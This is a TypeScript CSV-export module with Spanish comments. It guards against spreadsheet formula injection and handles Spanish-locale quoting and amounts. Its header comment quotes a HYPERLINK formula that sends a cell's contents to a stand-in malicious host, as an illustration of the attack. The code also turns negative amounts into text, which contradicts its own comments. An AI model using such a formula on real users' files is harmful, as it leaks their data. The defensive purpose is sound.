/**
 * Generación de CSV. Sin base de datos: texto a texto.
 *
 * ## Por qué esto no es `filas.map(f => f.join(","))`
 *
 * Un CSV se abre en Excel, y **Excel ejecuta las celdas que empiezan por `=`,
 * `+`, `-` o `@` como fórmulas**. Eso convierte un campo de texto que viene de
 * un usuario en código que corre en el ordenador de quien abre el fichero:
 *
 *     =HYPERLINK("http://sitio.malo/?d="&A1;"Haz clic")
 *
 * En Mobilink hay varios campos así —el concepto de un cobro, el nombre de un
 * cliente, el motivo de una anulación— y todos acaban en un informe que alguien
 * abre en su portátil. Se llama inyección de fórmulas, y es la razón de que
 * este fichero exista en vez de una línea con `join`.
 *
 * La defensa es anteponer un apóstrofo: Excel lo interpreta como «esto es
 * texto», no lo enseña en la celda, y la fórmula deja de serlo.
 *
 * ## Y lo de siempre del CSV
 *
 * Comas, comillas y saltos de línea dentro de un campo rompen el fichero si no
 * se entrecomillan. Un concepto como `Cobro "urgente", taller` sin comillas
 * convierte una fila en tres columnas mal alineadas, y a partir de ahí todas
 * las demás columnas del informe mienten.
 */

/** Caracteres con los que Excel decide que una celda es una fórmula. */
const PELIGROSOS = ["=", "+", "-", "@", "\t", "\r"];

/**
 * Una celda, ya segura.
 *
 * `null` y `undefined` salen como celda vacía y no como «null»: un informe con
 * la palabra «null» en veinte filas es un informe que alguien tiene que limpiar
 * a mano antes de enseñarlo.
 */
export function celda(valor: unknown): string {
  if (valor === null || valor === undefined) return "";

  let texto = String(valor);

  /*
   * El apóstrofo va ANTES de entrecomillar, no después: si se pusiera después,
   * quedaría fuera de las comillas y Excel volvería a ver la fórmula.
   */
  if (PELIGROSOS.some((c) => texto.startsWith(c))) {
    texto = `'${texto}`;
  }

  /*
   * Se entrecomilla por el SEPARADOR, que aquí es `;`, no por la coma.
   *
   * Parece un detalle y no lo es: los importes salen con coma decimal
   * (`1500,00`), así que entrecomillar por comas los envolvería a todos, y una
   * celda entrecomillada la lee Excel como TEXTO. La columna de importes
   * dejaría de sumar, que es exactamente el fallo que este fichero dice evitar
   * dos comentarios más arriba.
   */
  if (/[";\n\r]/.test(texto)) {
    return `"${texto.replace(/"/g, '""')}"`;
  }

  return texto;
}

/**
 * Un importe en céntimos, como lo espera una hoja de cálculo española.
 *
 * Con coma decimal y sin separador de miles: el punto de los miles hace que
 * Excel lea `1.234,56` como texto en algunas configuraciones regionales, y
 * entonces la columna no suma. Un informe de dinero cuya columna no suma no
 * sirve para nada.
 */
export function importe(centimos: number | null | undefined): string {
  if (centimos === null || centimos === undefined) return "";
  const signo = centimos < 0 ? "-" : "";
  const abs = Math.abs(centimos);
  return `${signo}${Math.floor(abs / 100)},${String(abs % 100).padStart(2, "0")}`;
}

/**
 * Filas a CSV.
 *
 * Separador `;` y no `,`: es lo que espera Excel en configuración española, y
 * con la coma decimal de los importes la coma como separador partiría cada
 * importe en dos columnas.
 *
 * Lleva BOM porque sin él Excel abre el fichero en la codificación del sistema
 * y los acentos salen rotos. Es un detalle tonto que arruina un informe entero.
 */
export function aCsv(cabeceras: readonly string[], filas: readonly unknown[][]): string {
  const lineas = [
    cabeceras.map(celda).join(";"),
    ...filas.map((f) => f.map(celda).join(";")),
  ];
  // `\uFEFF` escrito con su escape y no como carácter literal: un BOM
  // invisible en el código es una trampa para el siguiente que lo lea.
  return `\uFEFF${lineas.join("\r\n")}\r\n`;
}
